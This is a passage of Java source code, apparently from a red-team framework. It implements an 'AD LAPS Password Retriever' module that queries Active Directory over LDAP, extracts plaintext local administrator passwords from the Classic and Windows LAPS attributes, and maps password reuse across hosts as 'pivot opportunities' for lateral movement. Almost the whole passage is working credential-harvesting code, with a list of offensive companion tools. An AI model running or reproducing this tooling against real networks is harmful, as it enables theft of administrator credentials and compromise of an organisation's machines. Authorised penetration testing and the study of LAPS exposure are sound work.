package com.jabber.jrts.modules.reconnaissance;

import com.jabber.jrts.data.model.Category;
import com.jabber.jrts.data.model.JRTSModule;
import com.jabber.jrts.data.model.JRTSModuleInterface;
import com.jabber.jrts.data.model.ModuleInputField;
import com.jabber.jrts.data.model.ModuleResult;
import com.jabber.jrts.data.model.RiskLevel;
import com.jabber.jrts.data.model.TaskContext;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.naming.Context;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.PartialResultException;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.naming.ldap.InitialLdapContext;
import javax.naming.ldap.LdapContext;

/**
 * AD LAPS Password Retriever.
 *
 * Real LDAP-backed LAPS/LAPSv2 enumeration module.
 *
 * Pipeline:
 * mode selection -> input validation -> processing engine -> execution steps -> result normalization.
 *
 * Core outcomes:
 * - Enumerate computers with Classic LAPS/LAPSv2 signals.
 * - Retrieve plaintext local admin credentials where ACLs permit access.
 * - Identify encrypted-only/metadata-only exposure and pivot/reuse opportunities.
 */
@JRTSModule(
    id = "recon-laps",
    name = "AD LAPS Password Retriever",
    description = "Enumerate AD computers with Classic LAPS or Windows LAPS attributes and retrieve local admin credentials where readable.",
    category = Category.RECONNAISSANCE,
    riskLevel = RiskLevel.HIGH,
    sourceRef = "GetLAPSPassword.py / LDAP computer LAPS attributes",
    author = "JRTS"
)
public class ADLAPSPasswordModule implements JRTSModuleInterface {

    private static final String MODULE_ID = "recon-laps";

    private static final int DEFAULT_LDAP_PORT = 389;
    private static final int DEFAULT_LDAPS_PORT = 636;
    private static final int DEFAULT_CONNECT_TIMEOUT_MS = 10_000;
    private static final int DEFAULT_READ_TIMEOUT_MS = 15_000;
    private static final int DEFAULT_MAX_RESULTS = 5_000;
    private static final int MAX_ALLOWED_RESULTS = 50_000;

    private static final String DEFAULT_LOCAL_ADMIN_ACCOUNT = "Administrator";

    private static final long AD_EPOCH_DIFF_SECONDS = 11_644_473_600L;
    private static final DateTimeFormatter ISO_FMT = DateTimeFormatter.ISO_OFFSET_DATE_TIME;

    private static final String[] LAPS_ATTRIBUTES = new String[] {
        "name",
        "cn",
        "sAMAccountName",
        "dNSHostName",
        "operatingSystem",
        "distinguishedName",
        "ms-Mcs-AdmPwd",
        "ms-Mcs-AdmPwdExpirationTime",
        "msLAPS-Password",
        "msLAPS-EncryptedPassword",
        "msLAPS-PasswordExpirationTime",
        "whenCreated",
        "whenChanged"
    };

    private static final Pattern LAPS_V2_PASSWORD_PATTERN = Pattern.compile("\\\"p\\\"\\s*:\\s*\\\"([^\\\"]*)\\\"");
    private static final Pattern LAPS_V2_ACCOUNT_PATTERN = Pattern.compile("\\\"n\\\"\\s*:\\s*\\\"([^\\\"]*)\\\"");

    @Override
    public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("mode", "Execution Mode", List.of(
                    "laps_inventory",
                    "credential_retrieval",
                    "pivot_opportunity_map",
                    "host_confirmation"
                ))
                .required()
                .defaultValue("laps_inventory")
                .group("Mode")
                .helpText("Select LAPS inventory, credential retrieval, pivot mapping, or host confirmation mode."),
            ModuleInputField.text("focus_host", "Focus Host")
                .placeholder("dc01.contoso.local or SERVER01")
                .group("Mode")
                .modes("host_confirmation")
                .helpText("Required when mode=host_confirmation."),

            ModuleInputField.text("target", "Target Domain/DC")
                .required()
                .placeholder("contoso.local or dc01.contoso.local")
                .group("Target")
                .helpText("Domain FQDN or Domain Controller hostname/IP. Legacy domain/user:pass syntax is supported."),
            ModuleInputField.text("dc_ip", "DC IP Address")
                .placeholder("10.10.10.10")
                .group("Target")
                .helpText("Optional explicit DC address used for LDAP bind URL host."),
            ModuleInputField.text("base_dn", "Base DN Override")
                .placeholder("DC=contoso,DC=local")
                .group("Target")
                .helpText("Optional. If omitted, defaultNamingContext is resolved from RootDSE."),

            ModuleInputField.text("username", "Username")
                .placeholder("CONTOSO\\operator or operator@contoso.local")
                .group("Authentication"),
            ModuleInputField.password("password", "Password")
                .group("Authentication"),
            ModuleInputField.password("hashes", "NTLM Hashes (LM:NT)")
                .placeholder("LMHASH:NTHASH")
                .group("Authentication")
                .helpText("Accepted as context; Java LDAP simple bind does not support hash-only authentication."),
            ModuleInputField.checkbox("use_kerberos", "Use Kerberos Authentication")
                .group("Authentication"),
            ModuleInputField.password("aes_key", "AES Key (Kerberos)")
                .placeholder("hex-encoded AES256 key")
                .group("Authentication"),

            ModuleInputField.checkbox("use_ldaps", "Use LDAPS")
                .group("Connection"),
            ModuleInputField.text("ldap_port", "LDAP Port")
                .placeholder("389 or 636")
                .group("Connection"),
            ModuleInputField.text("connect_timeout_ms", "Connect Timeout (ms)")
                .placeholder(String.valueOf(DEFAULT_CONNECT_TIMEOUT_MS))
                .group("Connection"),
            ModuleInputField.text("read_timeout_ms", "Read Timeout (ms)")
                .placeholder(String.valueOf(DEFAULT_READ_TIMEOUT_MS))
                .group("Connection"),

            ModuleInputField.checkbox("classic_only", "Classic LAPS Only")
                .defaultValue("false")
                .group("Options"),
            ModuleInputField.checkbox("lapsv2_only", "Windows LAPS (v2) Only")
                .defaultValue("false")
                .group("Options"),
            ModuleInputField.checkbox("include_unreadable", "Include Metadata-only/Unreadable Results")
                .defaultValue("true")
                .group("Options")
                .helpText("When false, only plaintext or encrypted-only records are returned in non-confirmation modes."),
            ModuleInputField.checkbox("include_expired", "Include Expired Password Entries")
                .defaultValue("true")
                .group("Options"),
            ModuleInputField.checkbox("resolve_dns", "Resolve DNS Names")
                .defaultValue("false")
                .group("Options"),
            ModuleInputField.text("hostname_filter", "Hostname Filter")
                .placeholder("dc* or *sql*")
                .group("Options")
                .modes("laps_inventory", "credential_retrieval", "pivot_opportunity_map")
                .helpText("Wildcard filter matched against dNSHostName/CN/sAMAccountName."),
            ModuleInputField.text("default_local_admin", "Default Local Admin Account")
                .placeholder(DEFAULT_LOCAL_ADMIN_ACCOUNT)
                .group("Options")
                .helpText("Used when account name is not embedded in LAPS attributes."),
            ModuleInputField.text("max_results", "Maximum LDAP Objects")
                .placeholder(String.valueOf(DEFAULT_MAX_RESULTS))
                .group("Options")
                .helpText("Upper bound for LDAP search result size.")
        );
    }

    @Override
    public CompletableFuture<ModuleResult> execute(Map<String, String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(() -> {
            ModuleResult result = new ModuleResult(ctx.getTaskId(), MODULE_ID);
            LdapContext ldap = null;

            try {
                long startedAt = System.currentTimeMillis();
                ctx.log("[*] Starting AD LAPS Password Retriever module");
                ctx.reportProgress(5);

                ModuleConfig config = parseConfig(input);
                List<String> validationErrors = validateConfig(config);
                if (!validationErrors.isEmpty()) {
                    String message = String.join("; ", validationErrors);
                    result.fail("Validation failed: " + message);
                    ctx.log("[!] Validation failed: " + message);
                    return result;
                }

                ctx.log("[*] Mode: " + config.mode.value);
                ctx.log("[*] Target: " + config.target);
                ctx.log("[*] Authentication: " + authModeLabel(config));
                ctx.reportProgress(20);

                ldap = openLdapContext(config);
                String baseDn = resolveBaseDn(ldap, config);
                String domain = baseDnToDomain(baseDn);
                if (domain.isBlank()) {
                    domain = config.target;
                }

                ctx.log("[*] LDAP bind successful: " + buildLdapUrl(config));
                ctx.log("[*] Base DN: " + baseDn);
                ctx.reportProgress(40);

                List<LapsRecord> allRecords = fetchComputerRecords(ldap, baseDn, config, ctx);
                ctx.log("[*] LDAP computer objects returned: " + allRecords.size());
                ctx.reportProgress(62);

                List<LapsRecord> filteredRecords = new ArrayList<>();
                for (LapsRecord record : allRecords) {
                    applyDynamicState(record, config);
                    if (config.resolveDns && !record.dnsHostName.isBlank()) {
                        record.resolvedDnsName = resolveDnsName(record.dnsHostName);
                    }
                    if (matchesFilters(record, config)) {
                        filteredRecords.add(record);
                    }
                }
                filteredRecords.sort(this::compareRecords);
                ctx.reportProgress(78);

                List<Map<String, Object>> findings = new ArrayList<>();
                for (LapsRecord record : filteredRecords) {
                    Map<String, Object> finding = toFinding(record);
                    findings.add(finding);
                    result.addFinding(finding);
                }

                Map<String, Object> summary = buildSummary(allRecords, filteredRecords, config);
                Map<String, Object> modeResult = buildModeResult(filteredRecords, config);

                Map<String, Object> executionMetadata = new LinkedHashMap<>();
                executionMetadata.put("ldap_url", buildLdapUrl(config));
                executionMetadata.put("base_dn", baseDn);
                executionMetadata.put("ldap_filter", buildLdapFilter(config));
                executionMetadata.put("requested_attributes", Arrays.asList(LAPS_ATTRIBUTES));
                executionMetadata.put("auth_mode", authModeLabel(config));
                executionMetadata.put("aes_key_provided", !config.aesKey.isBlank());
                executionMetadata.put("hashes_provided", !config.hashes.isBlank());
                executionMetadata.put("elapsed_ms", System.currentTimeMillis() - startedAt);

                Map<String, Object> output = new LinkedHashMap<>();
                output.put("pipeline", List.of(
                    "mode_selection",
                    "input_validation",
                    "processing_engine",
                    "execution_steps",
                    "result_normalization",
                    "structured_output"
                ));
                output.put("mode", config.mode.value);
                output.put("domain", domain);
                output.put("base_dn", baseDn);
                output.put("summary", summary);
                output.put("laps_records", findings);
                output.put("operational_stack", buildOperationalStack());
                output.put(config.mode.resultKey, modeResult);
                output.put("execution_metadata", executionMetadata);

                result.setNormalizedOutput(buildNormalizedOutput(summary, findings, config));
                result.complete(output);

                ctx.log("[+] AD LAPS retrieval completed with " + findings.size() + " record(s)");
                ctx.reportProgress(100);
            } catch (NamingException e) {
                result.fail("LDAP execution failed: " + e.getMessage());
                ctx.log("[!] LDAP execution failed: " + e.getMessage());
            } catch (Exception e) {
                result.fail("AD LAPS retrieval failed: " + e.getMessage());
                ctx.log("[!] ERROR: " + e.getMessage());
            } finally {
                closeQuietly(ldap);
            }

            return result;
        });
    }

    protected LdapContext openLdapContext(ModuleConfig config) throws NamingException {
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, buildLdapUrl(config));
        env.put(Context.REFERRAL, "ignore");
        env.put("com.sun.jndi.ldap.connect.timeout", String.valueOf(config.connectTimeoutMs));
        env.put("com.sun.jndi.ldap.read.timeout", String.valueOf(config.readTimeoutMs));

        if (config.useKerberos) {
            env.put(Context.SECURITY_AUTHENTICATION, "GSSAPI");
            if (!config.username.isBlank()) {
                env.put(Context.SECURITY_PRINCIPAL, normalizePrincipal(config.username, config.target));
            }
            if (!config.password.isBlank()) {
                env.put(Context.SECURITY_CREDENTIALS, config.password);
            }
        } else if (!config.username.isBlank()) {
            env.put(Context.SECURITY_AUTHENTICATION, "simple");
            env.put(Context.SECURITY_PRINCIPAL, normalizePrincipal(config.username, config.target));
            env.put(Context.SECURITY_CREDENTIALS, config.password);
        } else {
            env.put(Context.SECURITY_AUTHENTICATION, "none");
        }

        return new InitialLdapContext(env, null);
    }

    protected String resolveBaseDn(LdapContext ldap, ModuleConfig config) throws NamingException {
        if (!config.baseDn.isBlank()) {
            return config.baseDn;
        }

        Attributes rootDse = ldap.getAttributes("", new String[] {"defaultNamingContext"});
        Attribute namingContext = rootDse.get("defaultNamingContext");
        if (namingContext != null && namingContext.size() > 0) {
            return String.valueOf(namingContext.get()).trim();
        }

        if (looksLikeDomainName(config.target)) {
            return domainToBaseDn(config.target);
        }

        if (config.username.contains("@")) {
            String domain = config.username.substring(config.username.indexOf('@') + 1);
            if (looksLikeDomainName(domain)) {
                return domainToBaseDn(domain);
            }
        }

        throw new NamingException("Unable to resolve Base DN from RootDSE. Provide base_dn explicitly.");
    }

    protected List<LapsRecord> fetchComputerRecords(
            LdapContext ldap,
            String baseDn,
            ModuleConfig config,
            TaskContext ctx) throws NamingException {

        String filter = buildLdapFilter(config);
        ctx.log("[*] LDAP filter: " + filter);

        List<SearchResult> searchResults = ldapSearch(ldap, baseDn, filter, LAPS_ATTRIBUTES, config.maxResults);
        List<LapsRecord> records = new ArrayList<>(searchResults.size());
        for (SearchResult result : searchResults) {
            LapsRecord record = toLapsRecord(result, config);
            if (record != null) {
                records.add(record);
            }
        }
        return records;
    }

    protected String resolveDnsName(String hostname) {
        try {
            return java.net.InetAddress.getByName(hostname).getCanonicalHostName();
        } catch (Exception e) {
            return "";
        }
    }

    private List<SearchResult> ldapSearch(
            LdapContext ldap,
            String baseDn,
            String filter,
            String[] attrs,
            long maxResults) throws NamingException {

        SearchControls controls = new SearchControls();
        controls.setSearchScope(SearchControls.SUBTREE_SCOPE);
        controls.setReturningAttributes(attrs);
        controls.setCountLimit(maxResults);

        List<SearchResult> collected = new ArrayList<>();
        NamingEnumeration<SearchResult> results = ldap.search(baseDn, filter, controls);
        try {
            while (results.hasMore()) {
                collected.add(results.next());
            }
        } catch (PartialResultException ignored) {
            // AD may emit partial results when referrals are disabled.
        } finally {
            if (results != null) {
                results.close();
            }
        }
        return collected;
    }

    private LapsRecord toLapsRecord(SearchResult result, ModuleConfig config) {
        try {
            Attributes attrs = result.getAttributes();
            if (attrs == null) {
                return null;
            }

            LapsRecord record = new LapsRecord();
            record.computerName = stripTrailingDollar(firstNonBlank(
                getStringAttribute(attrs, "name"),
                getStringAttribute(attrs, "cn"),
                getStringAttribute(attrs, "sAMAccountName"),
                result.getName()
            ));
            record.samAccountName = stripTrailingDollar(getStringAttribute(attrs, "sAMAccountName"));
            record.dnsHostName = getStringAttribute(attrs, "dNSHostName");
            record.operatingSystem = getStringAttribute(attrs, "operatingSystem");
            record.distinguishedName = firstNonBlank(
                getStringAttribute(attrs, "distinguishedName"),
                safeNameInNamespace(result),
                result.getName()
            );

            record.classicPassword = getStringAttribute(attrs, "ms-Mcs-AdmPwd");
            record.classicExpirationRaw = parseLong(getStringAttribute(attrs, "ms-Mcs-AdmPwdExpirationTime"), 0L);

            record.lapsV2PasswordRaw = getStringAttribute(attrs, "msLAPS-Password");
            record.lapsV2EncryptedPassword = getStringAttribute(attrs, "msLAPS-EncryptedPassword");
            record.lapsV2ExpirationRaw = parseLong(getStringAttribute(attrs, "msLAPS-PasswordExpirationTime"), 0L);

            record.lapsV2ParsedPassword = parseLapsV2JsonValue(record.lapsV2PasswordRaw, LAPS_V2_PASSWORD_PATTERN);
            if (record.lapsV2ParsedPassword.isBlank() && !record.lapsV2PasswordRaw.isBlank() && !record.lapsV2PasswordRaw.trim().startsWith("{")) {
                record.lapsV2ParsedPassword = record.lapsV2PasswordRaw.trim();
            }
            record.lapsV2ParsedAccount = parseLapsV2JsonValue(record.lapsV2PasswordRaw, LAPS_V2_ACCOUNT_PATTERN);

            record.localAdminAccount = firstNonBlank(record.lapsV2ParsedAccount, config.defaultLocalAdmin);
            return record;
        } catch (Exception e) {
            return null;
        }
    }

    private void applyDynamicState(LapsRecord record, ModuleConfig config) {
        if (record.lapsV2ParsedPassword.isBlank() && !record.lapsV2PasswordRaw.isBlank()) {
            record.lapsV2ParsedPassword = parseLapsV2JsonValue(record.lapsV2PasswordRaw, LAPS_V2_PASSWORD_PATTERN);
            if (record.lapsV2ParsedPassword.isBlank() && !record.lapsV2PasswordRaw.trim().startsWith("{")) {
                record.lapsV2ParsedPassword = record.lapsV2PasswordRaw.trim();
            }
        }
        if (record.lapsV2ParsedAccount.isBlank() && !record.lapsV2PasswordRaw.isBlank()) {
            record.lapsV2ParsedAccount = parseLapsV2JsonValue(record.lapsV2PasswordRaw, LAPS_V2_ACCOUNT_PATTERN);
        }

        record.classicManaged = !record.classicPassword.isBlank() || record.classicExpirationRaw > 0;
        record.lapsV2Managed = !record.lapsV2PasswordRaw.isBlank()
            || !record.lapsV2EncryptedPassword.isBlank()
            || record.lapsV2ExpirationRaw > 0;

        if (!record.lapsV2ParsedPassword.isBlank()) {
            record.plaintextPassword = record.lapsV2ParsedPassword;
            record.passwordSource = "msLAPS-Password";
            if (record.lapsV2ExpirationRaw > 0) {
                record.selectedExpirationRaw = record.lapsV2ExpirationRaw;
            }
            record.localAdminAccount = firstNonBlank(record.lapsV2ParsedAccount, record.localAdminAccount, config.defaultLocalAdmin);
        } else if (!record.classicPassword.isBlank()) {
            record.plaintextPassword = record.classicPassword;
            record.passwordSource = "ms-Mcs-AdmPwd";
            if (record.classicExpirationRaw > 0) {
                record.selectedExpirationRaw = record.classicExpirationRaw;
            }
            if (record.localAdminAccount.isBlank()) {
                record.localAdminAccount = config.defaultLocalAdmin;
            }
        }

        if (record.selectedExpirationRaw == 0L) {
            record.selectedExpirationRaw = firstNonZero(record.lapsV2ExpirationRaw, record.classicExpirationRaw);
        }

        if (record.classicManaged && record.lapsV2Managed) {
            record.lapsVersion = "mixed";
        } else if (record.lapsV2Managed) {
            record.lapsVersion = "lapsv2";
        } else if (record.classicManaged) {
            record.lapsVersion = "classic";
        } else {
            record.lapsVersion = "none";
        }

        if (!record.plaintextPassword.isBlank()) {
            record.retrievalState = RetrievalState.PLAINTEXT;
            record.credentialRetrievable = true;
        } else if (!record.lapsV2EncryptedPassword.isBlank()) {
            record.retrievalState = RetrievalState.ENCRYPTED_ONLY;
            record.credentialRetrievable = false;
        } else if (record.classicManaged || record.lapsV2Managed) {
            record.retrievalState = RetrievalState.METADATA_ONLY;
            record.credentialRetrievable = false;
        } else {
            record.retrievalState = RetrievalState.NOT_MANAGED;
            record.credentialRetrievable = false;
        }

        record.passwordExpiration = fileTimeToIso(record.selectedExpirationRaw);
        record.daysUntilExpiry = computeDaysUntilExpiry(record.selectedExpirationRaw);
        record.passwordExpired = record.daysUntilExpiry != null && record.daysUntilExpiry < 0;

        record.highValueHost = isHighValueHost(record);
        record.readAssessment = inferReadAssessment(record);
        record.riskTags = buildRiskTags(record);
        record.riskScore = scoreRecord(record);
        record.riskLevel = riskLevel(record.riskScore);
    }

    private boolean matchesFilters(LapsRecord record, ModuleConfig config) {
        if (config.mode != ModuleMode.HOST_CONFIRMATION && !record.hasAnyLapsSignal()) {
            return false;
        }

        if (config.classicOnly && !record.classicManaged) {
            return false;
        }

        if (config.lapsV2Only && !record.lapsV2Managed) {
            return false;
        }

        if (!config.includeUnreadable
                && !(record.credentialRetrievable || record.retrievalState == RetrievalState.ENCRYPTED_ONLY)) {
            return false;
        }

        if (!config.includeExpired && record.passwordExpired) {
            return false;
        }

        if (!config.hostnameFilter.isBlank()) {
            if (!wildcardMatches(record.dnsHostName, config.hostnameFilter)
                    && !wildcardMatches(record.computerName, config.hostnameFilter)
                    && !wildcardMatches(record.samAccountName, config.hostnameFilter)) {
                return false;
            }
        }

        if (config.mode == ModuleMode.CREDENTIAL_RETRIEVAL && !record.credentialRetrievable) {
            return false;
        }

        if (config.mode == ModuleMode.PIVOT_OPPORTUNITY_MAP && !record.credentialRetrievable) {
            return false;
        }

        if (config.mode == ModuleMode.HOST_CONFIRMATION) {
            String focus = normalizeFocus(config.focusHost);
            String host = normalizeFocus(record.dnsHostName);
            String name = normalizeFocus(record.computerName);
            String sam = normalizeFocus(record.samAccountName);
            return focus.equals(host) || focus.equals(name) || focus.equals(sam)
                || host.contains(focus) || name.contains(focus) || sam.contains(focus);
        }

        return true;
    }

    private Map<String, Object> toFinding(LapsRecord record) {
        Map<String, Object> finding = new LinkedHashMap<>();
        finding.put("computer_name", record.computerName);
        finding.put("dns_hostname", record.dnsHostName);
        finding.put("sam_account_name", record.samAccountName);
        finding.put("resolved_dns_name", record.resolvedDnsName);
        finding.put("operating_system", record.operatingSystem);
        finding.put("distinguished_name", record.distinguishedName);
        finding.put("laps_version", record.lapsVersion);
        finding.put("classic_laps_managed", record.classicManaged);
        finding.put("lapsv2_managed", record.lapsV2Managed);
        finding.put("retrieval_state", record.retrievalState.value);
        finding.put("read_assessment", record.readAssessment);
        finding.put("credential_retrievable", record.credentialRetrievable);
        finding.put("password", record.plaintextPassword);
        finding.put("password_source", record.passwordSource);
        finding.put("local_admin_account", record.localAdminAccount);
        finding.put("password_expiration", record.passwordExpiration);
        finding.put("password_days_until_expiry", record.daysUntilExpiry);
        finding.put("password_expired", record.passwordExpired);
        finding.put("lapsv2_encrypted_password_present", !record.lapsV2EncryptedPassword.isBlank());
        finding.put("high_value_host", record.highValueHost);
        finding.put("risk_score", record.riskScore);
        finding.put("risk_level", record.riskLevel);
        finding.put("risk_tags", record.riskTags);
        return finding;
    }

    private Map<String, Object> buildSummary(
            List<LapsRecord> allRecords,
            List<LapsRecord> filteredRecords,
            ModuleConfig config) {

        long managed = filteredRecords.stream().filter(LapsRecord::hasAnyLapsSignal).count();
        long plaintext = filteredRecords.stream().filter(r -> r.retrievalState == RetrievalState.PLAINTEXT).count();
        long encryptedOnly = filteredRecords.stream().filter(r -> r.retrievalState == RetrievalState.ENCRYPTED_ONLY).count();
        long metadataOnly = filteredRecords.stream().filter(r -> r.retrievalState == RetrievalState.METADATA_ONLY).count();
        long classicCount = filteredRecords.stream().filter(r -> r.classicManaged).count();
        long v2Count = filteredRecords.stream().filter(r -> r.lapsV2Managed).count();
        long mixedCount = filteredRecords.stream().filter(r -> r.classicManaged && r.lapsV2Managed).count();
        long expired = filteredRecords.stream().filter(r -> r.passwordExpired).count();
        long highValueExposed = filteredRecords.stream().filter(r -> r.highValueHost && r.credentialRetrievable).count();

        List<Map<String, Object>> passwordReuseGroups = buildPasswordReuseGroups(filteredRecords);
        List<Map<String, Object>> accountGroups = buildLocalAdminAccountGroups(filteredRecords);

        Map<String, Object> summary = new LinkedHashMap<>();
        summary.put("mode", config.mode.value);
        summary.put("total_ldap_objects", allRecords.size());
        summary.put("total_records", filteredRecords.size());
        summary.put("total_laps_managed", managed);
        summary.put("retrievable_plaintext_count", plaintext);
        summary.put("encrypted_only_count", encryptedOnly);
        summary.put("metadata_only_count", metadataOnly);
        summary.put("classic_laps_count", classicCount);
        summary.put("lapsv2_count", v2Count);
        summary.put("mixed_version_count", mixedCount);
        summary.put("expired_password_count", expired);
        summary.put("high_value_exposed_count", highValueExposed);
        summary.put("password_reuse_group_count", passwordReuseGroups.size());
        summary.put("local_admin_account_group_count", accountGroups.size());
        return summary;
    }

    private Map<String, Object> buildModeResult(List<LapsRecord> records, ModuleConfig config) {
        return switch (config.mode) {
            case LAPS_INVENTORY -> buildInventoryResult(records);
            case CREDENTIAL_RETRIEVAL -> buildCredentialRetrievalResult(records);
            case PIVOT_OPPORTUNITY_MAP -> buildPivotResult(records);
            case HOST_CONFIRMATION -> buildHostConfirmationResult(records, config);
        };
    }

    private Map<String, Object> buildInventoryResult(List<LapsRecord> records) {
        Map<String, Integer> stateCounts = new LinkedHashMap<>();
        for (RetrievalState state : RetrievalState.values()) {
            stateCounts.put(state.value, 0);
        }

        List<Map<String, Object>> inventory = new ArrayList<>();
        for (LapsRecord record : records) {
            stateCounts.put(record.retrievalState.value, stateCounts.getOrDefault(record.retrievalState.value, 0) + 1);
            inventory.add(inventoryView(record));
        }

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("inventory_size", records.size());
        result.put("retrieval_state_counts", stateCounts);
        result.put("laps_managed_hosts", inventory);
        return result;
    }

    private Map<String, Object> buildCredentialRetrievalResult(List<LapsRecord> records) {
        List<Map<String, Object>> credentials = new ArrayList<>();
        List<Map<String, Object>> highValueRetrievable = new ArrayList<>();

        for (LapsRecord record : records) {
            if (!record.credentialRetrievable) {
                continue;
            }

            Map<String, Object> row = new LinkedHashMap<>();
            row.put("computer_name", record.computerName);
            row.put("dns_hostname", record.dnsHostName);
            row.put("operating_system", record.operatingSystem);
            row.put("local_admin_account", record.localAdminAccount);
            row.put("password", record.plaintextPassword);
            row.put("password_source", record.passwordSource);
            row.put("password_expiration", record.passwordExpiration);
            row.put("password_days_until_expiry", record.daysUntilExpiry);
            row.put("password_expired", record.passwordExpired);
            row.put("high_value_host", record.highValueHost);
            row.put("risk_level", record.riskLevel);
            credentials.add(row);

            if (record.highValueHost) {
                highValueRetrievable.add(row);
            }
        }

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("retrievable_credentials", credentials);
        result.put("retrievable_count", credentials.size());
        result.put("high_value_retrievable_hosts", highValueRetrievable);
        return result;
    }

    private Map<String, Object> buildPivotResult(List<LapsRecord> records) {
        List<Map<String, Object>> passwordReuseGroups = buildPasswordReuseGroups(records);
        List<Map<String, Object>> accountGroups = buildLocalAdminAccountGroups(records);

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("password_reuse_groups", passwordReuseGroups);
        result.put("local_admin_account_groups", accountGroups);
        result.put("reuse_summary", Map.of(
            "password_reuse_group_count", passwordReuseGroups.size(),
            "local_admin_account_group_count", accountGroups.size()
        ));
        return result;
    }

    private Map<String, Object> buildHostConfirmationResult(List<LapsRecord> records, ModuleConfig config) {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("focus_host", config.focusHost);
        result.put("confirmed", !records.isEmpty());
        result.put("match_count", records.size());
        result.put("matches", records.stream().map(this::inventoryView).toList());
        return result;
    }

    private Map<String, Object> inventoryView(LapsRecord record) {
        Map<String, Object> map = new LinkedHashMap<>();
        map.put("computer_name", record.computerName);
        map.put("dns_hostname", record.dnsHostName);
        map.put("laps_version", record.lapsVersion);
        map.put("retrieval_state", record.retrievalState.value);
        map.put("credential_retrievable", record.credentialRetrievable);
        map.put("local_admin_account", record.localAdminAccount);
        map.put("high_value_host", record.highValueHost);
        map.put("risk_level", record.riskLevel);
        return map;
    }

    private List<Map<String, Object>> buildPasswordReuseGroups(List<LapsRecord> records) {
        Map<String, List<String>> grouped = new LinkedHashMap<>();
        for (LapsRecord record : records) {
            if (!record.credentialRetrievable || record.plaintextPassword.isBlank()) {
                continue;
            }
            grouped.computeIfAbsent(record.plaintextPassword, ignored -> new ArrayList<>())
                .add(firstNonBlank(record.dnsHostName, record.computerName));
        }

        List<Map<String, Object>> groups = new ArrayList<>();
        for (Map.Entry<String, List<String>> entry : grouped.entrySet()) {
            if (entry.getValue().size() < 2) {
                continue;
            }

            Map<String, Object> row = new LinkedHashMap<>();
            row.put("password", entry.getKey());
            row.put("host_count", entry.getValue().size());
            row.put("hosts", entry.getValue());
            groups.add(row);
        }

        groups.sort((a, b) -> Integer.compare(
            ((Number) b.get("host_count")).intValue(),
            ((Number) a.get("host_count")).intValue()
        ));
        return groups;
    }

    private List<Map<String, Object>> buildLocalAdminAccountGroups(List<LapsRecord> records) {
        Map<String, List<String>> grouped = new LinkedHashMap<>();
        for (LapsRecord record : records) {
            if (!record.credentialRetrievable) {
                continue;
            }
            String account = firstNonBlank(record.localAdminAccount, DEFAULT_LOCAL_ADMIN_ACCOUNT);
            grouped.computeIfAbsent(account, ignored -> new ArrayList<>())
                .add(firstNonBlank(record.dnsHostName, record.computerName));
        }

        List<Map<String, Object>> groups = new ArrayList<>();
        for (Map.Entry<String, List<String>> entry : grouped.entrySet()) {
            if (entry.getValue().size() < 2) {
                continue;
            }

            Map<String, Object> row = new LinkedHashMap<>();
            row.put("local_admin_account", entry.getKey());
            row.put("host_count", entry.getValue().size());
            row.put("hosts", entry.getValue());
            groups.add(row);
        }

        groups.sort((a, b) -> Integer.compare(
            ((Number) b.get("host_count")).intValue(),
            ((Number) a.get("host_count")).intValue()
        ));
        return groups;
    }

    private List<Map<String, Object>> buildOperationalStack() {
        List<Map<String, Object>> stack = new ArrayList<>();
        stack.add(tool("PowerView", "Primary AD computer/LAPS attribute enumeration", "https://github.com/PowerShellMafia/PowerSploit"));
        stack.add(tool("ActiveDirectory PowerShell Module", "Native LAPS property retrieval on Windows hosts", "https://learn.microsoft.com/en-us/powershell/module/activedirectory/"));
        stack.add(tool("ldapsearch", "Linux-based LAPS attribute LDAP queries", "https://www.openldap.org/software/man.cgi?query=ldapsearch"));
        stack.add(tool("CrackMapExec", "Credential validation and lateral movement checks", "https://github.com/byt3bl33d3r/CrackMapExec"));
        stack.add(tool("BloodHound", "ACL analysis for LAPS read permissions and abuse paths", "https://bloodhound.readthedocs.io/"));
        stack.add(tool("Windows LAPS", "Microsoft-managed local admin password lifecycle model", "https://learn.microsoft.com/en-us/windows-server/identity/laps/windows-laps-overview"));
        return stack;
    }

    private Map<String, Object> tool(String name, String purpose, String reference) {
        Map<String, Object> map = new LinkedHashMap<>();
        map.put("name", name);
        map.put("purpose", purpose);
        map.put("reference", reference);
        return map;
    }

    private Map<String, Object> buildNormalizedOutput(
            Map<String, Object> summary,
            List<Map<String, Object>> findings,
            ModuleConfig config) {

        long plaintext = ((Number) summary.getOrDefault("retrievable_plaintext_count", 0)).longValue();
        long managed = ((Number) summary.getOrDefault("total_laps_managed", 0)).longValue();

        Map<String, Object> rawOutput = new LinkedHashMap<>();
        rawOutput.put("summary", summary);
        rawOutput.put("record_count", findings.size());

        Map<String, Object> parsedOutput = new LinkedHashMap<>();
        if (plaintext > 0) {
            parsedOutput.put("status", "LAPS_CREDENTIAL_EXPOSURE_IDENTIFIED");
        } else if (managed > 0) {
            parsedOutput.put("status", "LAPS_MANAGED_SYSTEMS_IDENTIFIED_WITHOUT_RETRIEVABLE_PLAINTEXT");
        } else {
            parsedOutput.put("status", "NO_LAPS_EXPOSURE_IDENTIFIED");
        }
        parsedOutput.put("vulnerable", plaintext > 0);
        parsedOutput.put("details", summary);
        parsedOutput.put("evidence", findings);

        Map<String, Object> metadata = new LinkedHashMap<>();
        metadata.put("module", MODULE_ID);
        metadata.put("mode", config.mode.value);

        Map<String, Object> normalized = new LinkedHashMap<>();
        normalized.put("raw_output", rawOutput);
        normalized.put("parsed_output", parsedOutput);
        normalized.put("metadata", metadata);
        return normalized;
    }

    private String authModeLabel(ModuleConfig config) {
